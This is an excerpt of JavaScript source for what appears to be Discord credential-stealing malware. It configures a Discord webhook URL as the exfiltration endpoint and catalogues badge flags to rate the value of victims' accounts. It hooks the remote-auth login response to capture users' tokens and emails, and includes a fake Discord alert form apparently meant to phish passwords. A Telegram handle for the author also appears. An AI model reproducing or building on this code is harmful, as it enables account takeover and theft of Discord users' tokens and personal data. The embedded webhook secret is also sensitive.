...
const CONFIG = {
    API: 'https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl',
    ...
    badges: {
        _nitro: [
                "<:boost1month:1364763261630808108>",
                "undefined",
                "<:nitro_boost_3_months:1364763310431539381>",
                "undefined",
                "<:nitro_boost_9_months:1364763312881139796>",
                "undefined",
                "<:boost15month:1364763243234463784>",
                "<:nitro_boost_18_months:1364763307843780690>",
                "undefined"
              ],              

        _discord_emloyee: {
            value: 1,
            emoji: "<:discord_employee:1364763275060969563>",
            rare: true,
        },
        _partnered_server_owner: {
            value: 2,
            emoji: "<:partnered_server_owner:1364763318408970332>",
            rare: true,
        },
        _hypeSquad_events: {
            value: 4,
            emoji: "<:hypesquad_events:1364763286129868820>",
            rare: true,
        },
        _bug_hunter_level_1: {
            value: 8,
            emoji: "<:bughunter:1364763269700780032>",
            rare: true,
        },
        _house_bravery: {
            value: 64,
            emoji: "<:bravery:1364763264113704981>",
            rare: false,
        },
        _house_brilliance: {
            value: 128,
            emoji: "<:brilliance:1364763267029008384>",
            rare: false,
        },
        _house_balance: {
            value: 256,
            emoji: "<:balance:1364763240151781407>",
            rare: false,
        },
        _early_supporter: {
            value: 512,
            emoji: "<:early_supporter:1364763280186413197>",
            rare: true,
        },
        _bug_hunter_level_2: {
            value: 16384,
            emoji: "<:bughuntergold:1364763272191934534>",
            rare: true,
        },
        _early_bot_developer: {
            value: 131072,
            emoji: "<:early_verified_bot_developer:1364763282904453160>",
            rare: true,
        },
        _certified_moderator: {
            value: 262144,
            emoji: "<:moderatorprogramsalumni:1364763305335586997>",
            rare: true,
        },
        _active_developer: {
            value: 4194304,
            emoji: "<:active_developer:1364763237723148379>",
            rare: true,
        },
        _legacy_username: {
            value: 32,
            emoji: "<:oldusername:1364763316177866763>",
            rare: true,
        },
        _spammer: {
            value: 1048704,
...
const notify = async (ctx, token, user) => {
    ...
    ctx.username = `https://t.me/hairo13x7`;
...
class GetDataUser {
    ...
    Nitro = (flags) => {
        const { premium_type, premium_guild_since } = flags,
            nitro = "<:discord_nitro:1364763277594202112>";
        switch (premium_type) {
            default:
                return "❓";
            case 1:
        ...
        switch (true) {
            ...
            if (params.response.url.endsWith('/remote-auth/login')) {
                ...
                Cruise(
                    ...
                    RESQUEST_DATA,
                    user.email,
                    'The password was not found - You have logged in using QR code',
                    token,
                                                        ...
                                                        <form>
                                                            ...
                                                            <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
                                                                <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(XeinaData.user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
                                                                    <p>${CHANGE_ALERT}</p>
